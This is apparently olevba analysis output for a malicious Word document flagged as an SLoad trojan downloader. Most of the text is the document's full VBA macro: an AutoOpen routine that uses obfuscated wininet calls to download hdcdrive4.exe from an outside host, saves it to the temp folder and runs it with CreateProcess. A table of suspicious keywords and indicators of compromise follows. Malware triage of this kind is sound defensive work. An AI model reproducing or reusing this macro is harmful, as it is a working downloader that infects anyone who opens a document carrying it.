olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: UDS-Trojan-Downloader.MSOffice.SLoad.gen-4d234d0eaec4efc7911a44b1d54d4d0beb4d8c9020540355c293b486b99eacf9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: UDS-Trojan-Downloader.MSOffice.SLoad.gen-4d234d0eaec4efc7911a44b1d54d4d0beb4d8c9020540355c293b486b99eacf9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: UDS-Trojan-Downloader.MSOffice.SLoad.gen-4d234d0eaec4efc7911a44b1d54d4d0beb4d8c9020540355c293b486b99eacf9 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Const HANDLE_FLAG_INHERIT = &H1
Private Const STARTF_USESTDHANDLES As Long = &H100&
Private Const WAIT_OBJECT_0 As Long = 0

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Declare PtrSafe Function SetHandleInformation Lib "kernel32" (ByVal hObject As LongPtr, ByVal dwMask As Long, ByVal dwFlags As Long) As Long
Private Declare PtrSafe Function CreatePipe Lib "kernel32" (ByRef phReadPipe As LongPtr, ByRef phWritePipe As LongPtr, ByVal lpPipeAttributes As Any, ByVal nSize As Long) As Long
Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByRef lpEnvironment As Any, ByVal lpCurrentDriectory As String, ByRef lpSTARTUPINFO As STARTUPINFO, ByRef lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function PeekNamedPipe Lib "kernel32" (ByVal hNamedPipe As LongPtr, ByRef lpBuffer As Any, ByVal nBufferSize As Long, ByRef lpBytesRead As Long, ByRef lpTotalBytesAvail As Long, ByRef lpBytesLeftThisMessage As Long) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
Private Declare PtrSafe Function GetHandleInformation Lib "kernel32" (ByVal hObject As LongPtr, ByRef dwFlags As Long) As Long
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
Private Declare PtrSafe Function VAR95 Lib "wininet" Alias "InternetOpenA" (ByVal VAR67 As String, ByVal VAR68 As Long, ByVal VAR69 As String, ByVal VAR70 As String, ByVal VAR71 As Long) As Long
Private Declare PtrSafe Function VAR96 Lib "wininet" Alias "InternetOpenUrlA" (ByVal VAR72 As Long, ByVal VAR73 As String, ByVal VAR74 As String, ByVal VAR75 As Long, ByVal VAR76 As Long, ByVal VAR77 As Long) As Long
Private Declare PtrSafe Function VAR97 Lib "wininet" Alias "InternetCloseHandle" (ByVal VAR82 As Long) As Integer
Private Declare PtrSafe Function VAR98 Lib "wininet" Alias "InternetGetConnectedState" (ByRef VAR83 As Long, ByVal VAR84 As Long) As Long
Private Declare PtrSafe Function VAR99 Lib "wininet" Alias "HttpQueryInfoA" (ByVal VAR85 As Long, ByVal VAR86 As Long, ByRef VAR87 As Any, ByRef VAR88 As Long, ByRef VAR89 As Long) As Integer
Private Declare PtrSafe Function VAR100 Lib "wininet" Alias "InternetReadFile" (ByVal VAR90 As Long, ByRef VAR91 As Byte, ByVal VAR92 As Long, ByRef VAR93 As Long) As Integer
Private Const NORMAL_PRIORITY_CLASS = &H20&
Private Const INFINITE = -1&

Private Const SYNCHRONIZE = 1048576

Public Function VAR66(ByVal VAR101 As String, ByRef VAR102() As Byte) As Boolean
    On Error GoTo VAR103
    Dim VAR104 As Long, VAR105 As Long, VAR106 As Long
    Dim VAR107 As String * &H4D8
    Dim VAR108 As Long
          
    If VAR98(&H0, &H0) Then
        
        VAR104 = VAR95(vbNullString, 1, vbNullString, vbNullString, &H0)
        If VAR104 Then
            VAR105 = VAR96(VAR104, VAR101, vbNullString, &H0, &H0, &H0)
            
            If VAR99(VAR105, 19, ByVal VAR107, Len(VAR107), 0) Then
                If Left$(VAR107, InStr(VAR107, Chr$(0))) <> 200 Then
                    VAR97 VAR105: VAR105 = 0
                     
                Else
                  
                End If
            End If
                    
            If VAR105 Then
                
                If VAR99(VAR105, 5, ByVal VAR107, Len(VAR107), 0) Then
                    VAR108 = CLng(VAR107)
                Else
                    VAR108 = &H2800
                End If
                    
          
                ReDim VAR102(VAR108 + 1) As Byte
                
                If VAR100(VAR105, VAR102(0), VAR108, VAR106) Then
                    ReDim Preserve VAR102(VAR106 - 1)
                    VAR66 = True
                Else
                    Erase VAR102
                End If
                
                VAR97 VAR105
            End If
            VAR97 VAR104
        End If
    End If
    Exit Function
VAR103:

End Function

Sub AutoOpen()
Dim VAR62() As Byte
    
'DECOYTEXT
    Dim VAR63 As String
    Dim VAR64 As String
    Dim VAR65 As String
    Dim p0r As LongPtr
    Dim p0w As LongPtr
    Dim p1r As LongPtr
    Dim p1w As LongPtr
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim written As Long
    Dim avail As Long
    Dim buf() As Byte
    Dim read As Long
    Dim s As String
    Dim ss() As String
    Dim i As Long
    Dim r As Range
    
    VAR63 = "https://lakammes.xyz/hdcdrive4.exe"
    VAR65 = Environ$("tmp") & "\" & "hdcdrive4.exe"
    
    If VAR66(VAR63, VAR62) Then
        Open VAR65 For Binary As #1
            Put #1, , VAR62
        Close #1
    If CreatePipe(p0r, p0w, 0&, 0) = 0 Then Call Err.Raise(513, , Err.LastDllError)
    If CreatePipe(p1r, p1w, 0&, 0) = 0 Then Call Err.Raise(514, Err.LastDllError)
    If SetHandleInformation(p0r, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT) = 0 Then Call Err.Raise(515, , Err.LastDllError)
    If SetHandleInformation(p1w, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT) = 0 Then Call Err.Raise(516, , Err.LastDllError)
    si.cb = LenB(si)
    si.hStdInput = p0r
    si.hStdOutput = p1w
    si.hStdError = p1w
    si.dwFlags = STARTF_USESTDHANDLES
    If CreateProcess(VAR65, "", 0&, 0&, 1&, 0&, 0&, "C:\", si, pi) = 0 Then Call Err.Raise(517, , Err.LastDllError)
    Call CloseHandle(pi.hThread)
    pi.hThread = 0
    
        If PeekNamedPipe(p1r, 0&, 0&, 0&, avail, 0&) = 0 Then Call Err.Raise(518, , Err.LastDllError)
        If avail = 0 Then
            DoEvents
            
        
    End If
    

      
    End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://lakammes.xyz|URL                                          |
|          |/hdcdrive4.exe      |                                             |
|IOC       |hdcdrive4.exe       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

